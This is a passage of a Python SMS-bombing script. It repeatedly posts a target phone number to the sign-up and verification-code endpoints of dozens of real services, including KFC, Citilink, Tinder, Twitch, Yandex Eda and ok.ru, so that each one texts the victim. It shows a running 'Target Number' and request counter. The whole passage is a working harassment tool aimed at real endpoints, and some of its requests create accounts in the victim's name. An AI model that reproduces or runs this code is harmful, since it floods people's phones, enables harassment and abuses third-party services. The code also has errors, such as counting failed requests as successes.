                            'middleName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²ÃÂÃÂ¸ÃÂÃÂ',
                            'lastName': 'ÃÂÃÂÃÂÃÂ²ÃÂÃÂ°ÃÂÃÂ½ÃÂÃÂ¾ÃÂÃÂ²', 'sex': '1',
                            'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                            'isDSA': 'false', 'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                            'promotionAgreement': 'true'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 45

    try:
        requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 46
    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 47
    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 48

    try:
        requests.post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": _phone},
                                                         "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 49

    try:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 50

    try:
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 51

    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify", json={"phone": {"code": 1, "number": _phone}})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 52

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 53

    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                      data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                            "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 54

    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                      data={"password": password, "application": "lkp", "login": "+" + _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 55

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 56

    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 57

    try:
        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
                      json={'phone': '+' + self.formatted_phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 58

    try:
        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 59

    try:
        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                      params={"pageName": "registerPrivateUserPhoneVerificatio"},
                      data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 60

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 61

    try:
        requests.post('https://plink.tech/register/', json={"phone": _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 62

    try:
        requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 63

    try:
        requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 64

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                      data={'phone_number': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 65

    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',
                      json={"birthday": {"day": 11, "month": 11, "year": 1999},
                            "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                            "password": password, "phone_number": _phone, "username": username})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 66

    try:
        requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                      headers={'App-ID': 'cabinet'})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 67

    try:
        requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 68

    try:
        requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    # 69
    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 70

    try:
        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                      json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                            "deliveryOption": "sms"})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 71

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 72

    try:
        requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                      data={"st.r.phone": "+" + _phone})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1
    # 73

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        print(random.choice(colors))
        os.system('clear')
        print("================================================================")
        print("			Target Number         : ", _phone)
        print("")
        print("			Successful Requests   : ", success)
        print("================================================================")
    except:
        print('[-] Requests Failed!')
    try:
        success += 1

    except:
        failed += 1

    try:
        iteration += 1
        print("================================================================")
        print(' = {} Tours Success '.format(iteration))
        print("================================================================")
    except:
        break
